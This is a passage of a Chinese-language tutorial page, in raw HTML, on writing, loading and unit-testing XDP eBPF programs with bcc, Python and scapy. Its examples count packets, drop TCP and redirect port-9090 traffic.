class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="keyword">long</span> *cnt;</span><br><span class="line">  __u32 idx;</span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  idx = ip-&gt;protocol;</span><br><span class="line">  cnt = packetcnt.lookup(&amp;idx);</span><br><span class="line">  <span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">    *cnt += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以编写加载程序<code>loader.py</code></p><p>它由两部分组成：实际加载逻辑和打印数据包的循环计数。</p><p>对于加载逻辑，我们通过读取文件<code>program.c</code>打开程序。 通过<code>load_func</code>指示bpf系统调用使用程序类型 <code>BPF.XDP</code>将<code>myprogram</code>函数用作“main”。 这代表`BPF_PROG_TYPE_XDP    。</p><p>加载后，我们可以使用<code>get_table</code>访问名为<code>packetcnt</code>的BPF映射。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br></pre></td></tr></table></figure><p>我们需要编写的剩余部分是打印数据包计数的实际循环。我们有两个循环。 外部循环获取键盘事件并在有信号中断程序时终止。当外循环中断时，将调用<code>remove_xdp</code>函数，并将接口从XDP程序中释放出来。</p><p>在外循环中，内循环的职责是从<code>packetcnt</code>映射中取回值并格式化打印它们：<code>counter pkt/s</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">prev=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>) </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">val = packetcnt.sum(k).value i = k.value</span><br><span class="line"><span class="keyword">if</span> val:</span><br><span class="line">          delta = val - prev[i]</span><br><span class="line">prev[i] = val</span><br><span class="line">print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">print(<span class="string">"Removing filter from device"</span>) </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>loader.py</code>程序完整如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">device = <span class="string">"eth0"</span></span><br><span class="line">b = BPF(src_file=<span class="string">"program.c"</span>)</span><br><span class="line">fn = b.load_func(<span class="string">"myprogram"</span>, BPF.XDP)</span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line">packetcnt = b.get_table(<span class="string">"packetcnt"</span>)</span><br><span class="line"></span><br><span class="line">prev = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">print(<span class="string">"Printing packet counts per IP protocol-number, hit CTRL+C to stop"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> packetcnt.keys():</span><br><span class="line">            val = packetcnt.sum(k).value</span><br><span class="line">            i = k.value</span><br><span class="line">            <span class="keyword">if</span> val:</span><br><span class="line">                delta = val - prev[i]</span><br><span class="line">                prev[i] = val</span><br><span class="line">                print(<span class="string">"&#123;&#125;: &#123;&#125; pkt/s"</span>.format(i, delta))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"Removing filter from device"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b.remove_xdp(device, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>现在我们可以通过简单地使用执行加载程序来测试该程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# python3 loader.py</span><br></pre></td></tr></table></figure><p>现在我们已经加载了程序，可以通过eth0接口发送一些数据包，ping是一个很好的尝试方法。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bcc]# ping 10.0.16.14</span><br><span class="line">PING 10.0.16.14 (10.0.16.14) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=1 ttl=64 time=0.012 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=2 ttl=64 time=0.019 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=3 ttl=64 time=0.021 ms</span><br><span class="line">64 bytes from 10.0.16.14: icmp_seq=4 ttl=64 time=0.021 ms</span><br></pre></td></tr></table></figure><p>之后可以看到程序开始打印结果。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Printing packet counts per IP protocol-number, hit CTRL+C to stop</span><br><span class="line">0: 1 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br><span class="line">1: 1 pkt/s</span><br><span class="line">0: 0 pkt/s</span><br></pre></td></tr></table></figure><h3 id="测试XDP程序"><a href="#测试XDP程序" class="headerlink" title="测试XDP程序"></a>测试XDP程序</h3><p>在开发XDP程序时，最困难的部分是为了测试实际的数据包流需要重现一个环境，其中所有组件都对齐以提供正确的数据包。尽管现在使用虚拟化技术，创建工作环境确实是一件容易的事，但复杂的设置也会限制测试环境的可重复性和可编程性，这也是事实。 除此之外，在虚拟化环境中分析XDP程序的性能方面时，虚拟化的成本使测试无效，因为它比实际的数据包处理要可观得多。</p><p>幸运的是，内核开发人员有一个解决方案。他们实现了一个可用于测试XDP程序的命令，称为<code>BPF_PROG_TEST_RUN</code>。</p><p>本质上，<code>BPF_PROG_TEST_RUN</code>让XDP程序连同一个输入包和一个输出包一起执行。 程序执行时，会填充输出数据包变量，并返回XDP代码。 这意味着你可以在断言测试中使用输出数据包和返回代码！这种技术也可以用于<code>skb</code>程序。</p><p>为了完整测试这个示例，我们使用Python及其单元测试框架。</p><h4 id="使用Python单元测试框架测试XDP程序"><a href="#使用Python单元测试框架测试XDP程序" class="headerlink" title="使用Python单元测试框架测试XDP程序"></a>使用Python单元测试框架测试XDP程序</h4><p>使用<code>BPF_PROG_TEST_RUN</code>编写XDP测试并将它们与Python单元测试框架<code>unittest</code>集成是一个好主意，原因如下：</p><ul><li>你可以使用Python BCC库加载和执行BPF程序</li><li>Python拥有最好的数据包制作和自省库之一：<code>scapy</code></li><li>Python通过<code>ctypes</code>与C结构集成</li></ul><p>如前所述，我们需要导入所有需要的库；这是我们将在名为<code>test_xdp.py</code>的文件中做的第一件事：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span> </span><br><span class="line">  SKB_OUT_SIZE = <span class="number">1514</span> <span class="comment"># mtu 1500 + 14 ethernet size </span></span><br><span class="line">  bpf_function = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>导入所有需要的库后，我们可以继续并创建一个名为<code>XDPExampleTestCase</code>的测试用例类。 这个测试类将包含我们所有的测试用例和成员方法(<code>_xdp_test_run</code>)，我们将使用它来进行断言并调用<code>bpf_prog_test_run</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br></pre></td></tr></table></figure><p>该函数有三个参数</p><p>given_packet：这是我们测试XDP程序的数据包； 它是接口接收到的原始数据包。</p><p>expected_packet：这是我们期望在XDP程序处理后收到的数据包；当XDP程序返回<code>XDP_DROP</code>或<code>XDP_ABORT</code>时，我们希望它为None；在所有其他情况下，数据包与<code>given_packet</code>保持相同或可以修改。</p><p>expected_return：这是处理我们的<code>given_packet</code>后XDP程序的预期返回。</p><p>除了参数之外，这个方法的主体很简单。它使用<code>ctypes</code>库转换为C类型，然后调用与<code>BPF_PROG_TEST_RUN</code>等效的<code>libbcc</code>，<code>libbcc.lib.bpf_prog_test_run</code>，使用我们的数据包及其元数据作为测试参数。然后根据测试调用的结果以及给定的值执行所有断言。</p><p>有了这个功能之后，我们基本上可以通过制作不同的数据包来测试它们在通过我们的XDP程序时的行为方式来编写测试用例，但在此之前，我们需要为我们的测试做一个<code>setUp</code>方法。</p><p>这部分至关重要，因为安装程序通过打开并编译名为<code>program.c</code>的源文件（这是我们的XDP代码所在的文件）来执行名为<code>myprogram</code>的BPF程序的实际加载：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">    bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">    self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br></pre></td></tr></table></figure><p>设置完成后，下一步是编写我们要观察的第一个行为。我们想测试一下我们是否会丢弃所有TCP数据包。</p><p>所以我们在<code>given_packet</code>中制作了一个数据包，它只是一个基于IPv4的TCP数据包。 然后，使用我们的断言方法<code>_xdp_test_run</code>，我们只是验证给定我们的数据包，我们将返回一个没有返回数据包的 <code>XDP_DROP</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP()</span><br><span class="line">    self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br></pre></td></tr></table></figure><p>我们还想明确测试是否允许所有UDP数据包。 然后我们制作两个UDP数据包，一个用于<code>given_packet</code>，一个用于<code>expected_packet</code>，它们本质上是相同的。 通过这种方式，我们测试UDP数据包在<code>XDP_PASS</code>允许的情况下不会被修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / UDP()</span><br><span class="line">    expected_packet = Ether() / IP() / UDP()</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br></pre></td></tr></table></figure><p>为了让事情变得更复杂一点，我们决定这个系统将允许TCP数据包在它们到达端口9090的条件下。它们将被重写以更改目标MAC地址以重定向到特定的网络。地址为<code>08:00:27:dd:38:2a</code>的工作接口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">    given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">        IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">    self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br></pre></td></tr></table></figure><p>有了大量的测试用例，我们现在为我们的测试程序编写入口点，它只会调用 unittest.main() 然后加载并执行我们的测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  unittest.main()</span><br></pre></td></tr></table></figure><p><code>test_xdp.py</code>完整程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, libbcc</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> Ether, IP, raw, TCP, UDP</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    SKB_OUT_SIZE = <span class="number">1514</span>  <span class="comment"># mtu 1500 + 14 ethernet size</span></span><br><span class="line">    bpf_function = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">        self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP()</span><br><span class="line">        self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / UDP()</span><br><span class="line">        expected_packet = Ether() / IP() / UDP()</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">            IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>我们已经为XDP程序编写了测试！现在我们已经将测试作为我们想要的特定示例，我们可以通过创建一个名为<code>program.c</code>的文件来编写实现它的XDP程序。</p><p>程序很简单。它只包含<code>myprogram</code> XDP函数和我们刚刚测试的逻辑。与往常一样，我们需要做的第一件事是包含所需的标题。有一个BPF程序将处理通过以太网传输的TCP/IP：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>同样，与本章中的其他程序一样，我们需要检查数据包三层的偏移量和填充变量：<code>ethhdr、iphdr和 tcphdr</code>，分别用于以太网、IPv4和TCP：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一旦有了值，我们就可以实现相应逻辑。</p><p>第一件要做的事是检查协议是否为TCP <code>ip-&gt;protocol == IPPROTO_TCP</code>。 如果是，我们总是做一个<code>XDP_DROP</code>； 否则，对其他所有内容执行<code>XDP_PASS</code>。</p><p>在检查TCP协议时，我们做另一个控制来检查目标端口是否为9090，<code>th-&gt;dest == htons(9090)</code>; 如果是，我们在以太网层改变目的MAC地址，返回<code>XDP_TX</code>，通过同一个网卡反弹数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 